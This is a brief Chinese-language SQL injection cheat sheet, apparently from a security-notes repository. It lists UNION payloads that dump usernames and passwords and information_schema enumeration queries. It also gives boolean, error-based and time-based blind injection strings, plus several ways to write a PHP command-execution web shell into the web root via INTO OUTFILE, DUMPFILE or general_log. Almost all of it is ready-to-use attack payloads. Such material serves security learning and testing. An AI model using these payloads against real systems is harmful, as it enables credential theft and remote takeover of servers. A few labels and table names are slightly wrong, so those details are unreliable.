# Web-Security-Cheatsheet

## SQL Injection

https://portswigger.net/web-security/sql-injection/cheat-sheet

### 目標

被放入 SQL 語句的資料如表單、參數、cookie 等

> 如果放在 http request 則要注意 url encode

### 基礎

- 欄位數: `' UNION SELECT NULL,NULL,NULL-- `
- 型別: `' UNION SELECT 'a',NULL,NULL,NULL--`
- 合併不同欄位: `' UNION SELECT username || '~' || password FROM users--`
- 合併同一欄位所有資料: `' UNION SELECT group_concat(username) FROM users--`

#### 額外資料

- 資料庫名: `SELECT table_schema FROM information_schema.schema`
- 資料表名: `SELECT table_name FROM information_schema.tables where table_schema == 'target'`
- 欄位名: `SELECT column_name FROM information_schema.columns WHERE table_name = 'users'`
- 欄位型別: `SELECT data_type FROM information_schema.columns WHERE table_name = 'users'`

### Blind SQL Injection

[範例](simple_blind_sql_injection.py)

- UNION-Based: `' AND (condition)-- `
- Error-Based: `' OR (SELECT CASE WHEN (condition) THEN 1/0 ELSE 1 END)-- `
- Time-Based: `'; (SELECT CASE WHEN (condition) THEN sleep(3) ELSE sleep(0) END)-- `

### 檔案寫入
- `SELECT '<?php exec($_GET["cmd"])' INTO OUTFILE '/var/www/html/shell.php'`
- `SELECT '<?php exec($_GET["cmd"])' INTO DUMPFILE '/var/www/html/shell.php'`
- 
```sql
set global general_log = on;
set global general_log_file = '/var/www/html/shell.php';
select '<?php exec($_GET["cmd"])'
set global general_log = off;
```
